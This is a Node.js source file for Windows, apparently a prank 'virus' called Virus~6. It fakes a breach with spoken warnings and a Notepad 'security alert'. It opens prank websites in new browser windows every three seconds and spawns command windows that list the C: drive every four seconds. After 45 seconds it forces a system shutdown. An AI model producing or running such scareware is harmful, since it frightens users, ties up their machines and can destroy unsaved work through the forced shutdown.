const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");

const hackweb = [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll
    "https://geekprank.com/hacker/",
    "https://geekprank.com/bios/",
    "https://you-are-idiot.github.io/",
    "https://hackprank.com/",
    "https://hackedscreen.com/",
    "https://www.google.com/search?q=how+to+stop+a+virus"
];

function randrange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function speak(message) {
    const command = `powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('${message}')"`;
    exec(command);
}

function createSecurityAlert() {
    const filePath = path.join(process.env.TEMP || '.', "SecurityAlert.txt");
    const content = `
    CRITICAL SYSTEM ALERT
    ---------------------
    Unauthorized access detected at ${new Date().toLocaleString()}.
    Protocol Virus~6 has been initialized.
    System resources are being redirected.
    Do not attempt to restart the machine.
    `;
    fs.writeFileSync(filePath, content);
    exec(`start notepad "${filePath}"`);
}

function installBrowser(browser = ["chrome", "firefox", "brave", "msedge", "opera", "vivaldi"]) {
    return new Promise((resolve, reject) => {
        exec("winget list", (error, stdout) => {
            if (error) return resolve(["msedge"]); // Fallback to Edge if winget fails

            const installed = [];
            const output = (stdout || "").toLowerCase();

            browser.forEach(browserName => {
                if (output.includes(browserName.toLowerCase())) {
                    installed.push(browserName);
                }
            });

            resolve(installed.length > 0 ? installed : ["msedge"]);
        });
    });
}

function openWebsite(url, browser) {
    const command = `start ${browser} --new-window -private "${url}"`;
    exec(command);
}

async function main() {
    console.log("Initializing Virus~6...");
    
    // Unique features: Voice and Notepad alert
    speak("System compromise detected. Initializing protocol Alpha 6. Please remain calm.");
    createSecurityAlert();

    try {
        const browsers = await installBrowser();
        
        // Opening websites every 3 seconds
        setInterval(() => {
            const url = hackweb[randrange(0, hackweb.length - 1)];
            const browser = browsers[randrange(0, browsers.length - 1)];
            openWebsite(url, browser);
        }, 3000);

        // Matrix-style command prompt every 4 seconds
        setInterval(() => {
            exec('start cmd /k "color 02 & echo ACCESSING SECURE FILES... & dir /s C:\\"');
        }, 4000);

        // Occasional speech reminders
        setInterval(() => {
            const lines = ["Decrypting password hashes.", "Uploading system data.", "Connection established."];
            speak(lines[randrange(0, lines.length - 1)]);
        }, 15000);

    } catch (error) {
        console.error("Error:", error);
    }

    // Shutdown warning
    setTimeout(() => {
        speak("System will terminate in sixty seconds. Save your work.");
        exec("shutdown /s /t 60 /c \"Virus~6: Critical System Failure Simulation\"");
    }, 45000);
}

main();
